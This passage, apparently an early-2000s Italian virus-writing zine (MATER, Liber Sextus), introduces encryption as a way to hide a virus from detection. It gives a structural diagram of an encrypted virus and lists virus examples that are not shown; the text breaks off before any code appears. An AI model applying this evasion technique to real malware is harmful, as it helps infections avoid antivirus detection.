<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="./MATER_6_file/filelist.xml">
<title> INDEX</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Administrator</o:Author>
  <o:LastAuthor>Administrator</o:LastAuthor>
  <o:Revision>3</o:Revision>
  <o:TotalTime>303</o:TotalTime>
  <o:Created>2001-01-11T12:15:00Z</o:Created>
  <o:LastSaved>2001-01-11T12:17:00Z</o:LastSaved>
  <o:Pages>27</o:Pages>
  <o:Words>7473</o:Words>
  <o:Characters>42601</o:Characters>
  <o:Lines>355</o:Lines>
  <o:Paragraphs>85</o:Paragraphs>
  <o:CharactersWithSpaces>52317</o:CharactersWithSpaces>
  <o:Version>9.2812</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:ActiveWritingStyle Lang="EN-US" VendorID="64" DLLVersion="131077"
   NLCheck="1">1</w:ActiveWritingStyle>
  <w:ActiveWritingStyle Lang="IT" VendorID="3" DLLVersion="517" NLCheck="0">1</w:ActiveWritingStyle>
  <w:HyphenationZone>14</w:HyphenationZone>
  <w:DrawingGridHorizontalSpacing>6 pt</w:DrawingGridHorizontalSpacing>
  <w:DisplayHorizontalDrawingGridEvery>2</w:DisplayHorizontalDrawingGridEvery>
  <w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:Courier;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"MS Mincho";
	panose-1:2 2 6 9 4 2 5 8 3 4;
	mso-font-alt:"\FF2D\FF33 \660E\671D";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-pitch:fixed;
	mso-font-signature:-1610612033 1757936891 16 0 131231 0;}
@font-face
	{font-family:"MS Gothic";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:"\FF2D\FF33 \30B4\30B7\30C3\30AF";
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:"\@MS Mincho";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:"\@MS Gothic";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
h1
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:1;
	mso-layout-grid-align:none;
	text-autospace:none;
	font-size:12.0pt;
	mso-bidi-font-size:16.0pt;
	font-family:"Times New Roman";
	mso-font-kerning:0pt;
	mso-ansi-language:EN-US;}
h2
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:2;
	mso-layout-grid-align:none;
	text-autospace:none;
	font-size:10.0pt;
	mso-bidi-font-size:8.0pt;
	font-family:"Courier New";}
h3
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:3;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"MS Mincho";
	color:white;}
h5
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:5;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	color:white;}
p.MsoHeading8, li.MsoHeading8, div.MsoHeading8
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:8;
	font-size:18.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;
	text-underline:single;}
p.MsoPlainText, li.MsoPlainText, div.MsoPlainText
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Times New Roman";}
pre
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"MS Gothic";
	mso-hansi-font-family:"Courier New";
	mso-bidi-font-family:"Courier New";
	color:black;
	mso-fareast-language:JA;}
@page Section1
	{size:595.3pt 841.9pt;
	margin:1.0cm 1.0cm 1.0cm 1.0cm;
	mso-header-margin:35.45pt;
	mso-footer-margin:35.45pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1027">
  <o:colormru v:ext="edit" colors="#c4e7fe"/>
  <o:colormenu v:ext="edit" fillcolor="#c4e7fe"/>
 </o:shapedefaults></xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor="#c4e7fe" lang=IT link=blue vlink=purple style='tab-interval:
35.4pt'>

<div class=Section1>

<p class=MsoPlainText align=center style='text-align:center'><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>M</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:blue'>inima</span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:green'> </span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:red'>A</span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:blue'>nonyma</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:green'> </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>T</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:blue'>abularia</span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:green'> </span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:red'>E</span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:blue'>x</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:green'> </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>R</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:blue'>eti</span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></b></p>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#666699'>nihil vacuum neque sine signo apud </span></i><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#33CCCC'>MATER<o:p></o:p></span></i></p>

<h3><a name="_Ref500557024"><span style='color:blue'>Liber Sextus</span></a><span
style='color:blue'><o:p></o:p></span></h3>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='mso-fareast-font-family:"MS Mincho";color:blue'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<h2 align=center style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;
margin-left:54.0pt;margin-bottom:.0001pt;text-align:center'><span
style='font-size:9.0pt;mso-bidi-font-size:8.0pt;font-family:Arial;color:blue;
font-weight:normal'>Questa è la zine ufficiale di Familia, un gruppo che ha
come oggetto di studio la programmazione virale.<o:p></o:p></span></h2>

<h2 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
54.0pt;margin-bottom:.0001pt;text-align:justify'><span style='font-size:9.0pt;
mso-bidi-font-size:8.0pt;font-family:Arial;color:blue;font-weight:normal'>MATER
ha come scopo l’esame delle tecniche di programmazione virale e delle
problematiche ad esse associate. Questa è una raccolta di contributi volontari
(e non) di alcuni code-writers del pianeta, in lingua italiana ed è rivolta
soprattutto a chi si avvicina per la prima volta al mondo dei virus e necessita
dei concetti di base che spesso sono dati per scontati nelle zines reperibili
in Rete. Non è, tuttavia, una esemplificazione discorsiva priva di contenuto
tecnico: per comprendere gli esempi ivi contenuti è necessaria una minima
conoscenza dell’architettura di un elaboratore e del linguaggio assembler.<o:p></o:p></span></h2>

<h2 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
54.0pt;margin-bottom:.0001pt;text-align:justify'><span style='font-size:9.0pt;
mso-bidi-font-size:8.0pt;font-family:Arial;color:blue;font-weight:normal'>E’
nostra convinzione che una migliore conoscenza delle metodologie infettive
digitali sia la principale strada per accrescere la sicurezza degli utenti e
fornire un contributo a chi opera nel settore della programmazione. Ritenendo
il vero nemico della sicurezza la disinformazione, auspichiamo che una più
profonda comprensione in questo campo dissipi i dubbi, aiuti la ricerca e
contribuisca al progresso dell’educazione informatica<i>. Sursum Corda !</i><span
style="mso-spacerun: yes">  </span><o:p></o:p></span></h2>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:54.0pt;margin-bottom:.0001pt'><span style='font-size:10.0pt;
mso-bidi-font-size:12.0pt;color:blue'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:54.0pt;margin-bottom:.0001pt'><span style='color:blue'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h5 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
54.0pt;margin-bottom:.0001pt'><span style='font-size:16.0pt;mso-bidi-font-size:
12.0pt;color:blue'>ATTENZIONE<o:p></o:p></span></h5>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:54.0pt;margin-bottom:.0001pt;text-align:justify'><span
style='font-family:Arial;color:blue'>Questa pubblicazione contiene informazioni
e codice sorgente relativi alla sicurezza informatica. </span><span
style='font-family:Arial;mso-fareast-font-family:"MS Mincho";color:blue'>Lo
scopo di queste informazioni è di aiutare gli utenti ad accrescere la propria
capacità di programmazione. Questo materiale è a puro scopo didattico e non
include codice distruttivo né documenti attinenti ad alcuna attività illegale.
Si declina ogni responsabilità nel caso chiunque utilizzi le suddette
informazioni per creare, compilare e diffondere intenzionalmente programmi
diretti a danneggiare o interrompere un sistema informatico o telematico,
ovvero a provocarne l'interruzione, totale o parziale, o l'alterazione del suo
funzionamento <i>Art. 615-quinquies (Legge n. 547/93 pubblicata in Gazzetta
Ufficiale n. 305 del 30.12.1993)</i></span><span style='font-family:Arial;
color:blue'><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoHeading8><b><span style='color:green'><span style="mso-spacerun:
yes"> </span>§ MATER</span></b><span style='color:green'> Liber Sextus <b>§<o:p></o:p></b></span></p>

<p class=MsoNormal><span style='color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h2><span style='font-size:14.0pt;mso-bidi-font-size:8.0pt;font-family:"Times New Roman";
color:green;font-weight:normal'><span style="mso-spacerun: yes">   </span>LA
CRITTOGRAFIA<o:p></o:p></span></h2>

<p class=MsoNormal><span style='mso-fareast-font-family:"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
16.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";color:green'><span
style="mso-spacerun: yes">   </span>indice<o:p></o:p></span></b></p>

<h2><a name="_1.definizione"></a><span style='font-size:12.0pt;mso-bidi-font-size:
8.0pt;font-family:"Times New Roman";color:green;font-weight:normal'><span
style="mso-spacerun: yes">           </span><a href="#_1._definizione"><span
style='color:green'>1.definizione</span></a><o:p></o:p></span></h2>

<p class=MsoNormal><span style='color:green'><span style="mso-spacerun:
yes">           </span><a href="#_2.come_viene_crittografato"><span
style='color:green'>2.come viene crittografato il codice ?</span></a><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'><span
style="mso-spacerun: yes">           </span><a href="#_3._la_routine"><span
style='color:green'>3. la routine di crittografazione</span></a><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'><span
style="mso-spacerun: yes">           </span><a href="#_4._qualche_esempio"><span
style='color:green'>4. qualche esempio</span></a><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:11.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><span style="mso-spacerun: yes">               </span></span><span
lang=FR style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:FR'><a
href="#_1._Virus_T-100:"><span lang=IT style='color:green;mso-ansi-language:
IT'>1. Virus T-100</span></a></span><span style='font-size:11.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
color:green'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:11.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><span style="mso-spacerun: yes">               </span></span><span
lang=FR style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:FR'><a
href="#_2._Virus_HCarry:"><span lang=EN-US style='color:green;mso-ansi-language:
EN-US'>2. Virus HCarry</span></a></span><span lang=EN-US style='font-size:11.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green;mso-ansi-language:EN-US'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">               </span><a href="#_3._Virus_Oneline:"><span
style='color:green'>3. Virus Oneline</span></a><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">               </span></span><span style='font-size:
11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><a href="#_4._Virus_Bbrains:"><span lang=FR
style='color:green;mso-ansi-language:FR'>4. Virus Bbrains</span></a></span><span
lang=FR style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:FR'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:FR'><span
style="mso-spacerun: yes">               </span></span><span style='font-size:
11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><a href="#_5._Virus_sKism"><span lang=FR
style='color:green;mso-ansi-language:FR'>5. Virus sKism 808</span></a></span><span
lang=FR style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:FR'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:FR'><span
style="mso-spacerun: yes">               </span></span><span lang=EN-US
style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green;mso-ansi-language:EN-US'><a
href="#_6._Virus_Enmity:"><span lang=IT style='color:green;mso-ansi-language:
IT'>6. Virus Enmity</span></a></span><span style='font-size:11.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
color:green'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#993300'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_1._definizione"></a><span style='mso-fareast-font-family:"MS Mincho";
color:red;mso-ansi-language:IT'>1. definizione<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>La crittografia è uno dei metodi per nascondere le
tracce della presenza di un virus. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Le tecniche di crittografia non sono affatto recenti,
ma continuano ad essere utilizzate e si sono evolute attraverso il polimorfismo
(che sarà oggetto di un prossimo studio).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>La struttura di di un virus crittografato (encrypted)
assomiglia a qualcosa del tipo:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman";
color:green'><span style="mso-spacerun: yes">       </span></span></b><b><span
style='font-family:Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Times New Roman"'><span style="mso-spacerun: yes">  </span>-----------------------------------------------<span
style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">         </span>A] salto alla routine di
decrittazione<span style="mso-spacerun: yes">         </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">        
</span>-----------------------------------------------<span
style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">         </span>B] corpo del file infetto (HOST)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">          </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">         </span>-----------------------------------------------<span
style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">         </span>C] routine di decrittazione (non
crittografata)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">        
</span>-----------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">         </span>D] corpo del virus (crittografato)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">            </span>E] routine di
crittografazione<span style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">        
</span>-----------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho"'><span style="mso-spacerun: yes">          </span><span
style='color:green'><o:p></o:p></span></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Quando il file Host viene caricato in memoria per
essere eseguito, il controllo viene preso dalle istruzioni del virus [A] che
effettuano un salto alla routine di decrittazione [C]. La routine di
decrittazione decritta il corpo del virus rendendo il codice effettivamente
eseguibile.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Quindi il controllo passa al codice costituente corpo
del virus decrittato [D] che esegue il suo compito. Fra i compiti del codice
virale c’è ovviamente quello, una volta eseguita un’infezione, di crittografare
il corpo del virus “appeso” al nuovo ospite. In questo modo ogni copia del
virus presente su disco risulterà crittografata.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_2.come_viene_crittografato"></a><span style='mso-fareast-font-family:
"MS Mincho";color:red;mso-ansi-language:IT'>2.come viene crittografato il
codice ?<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
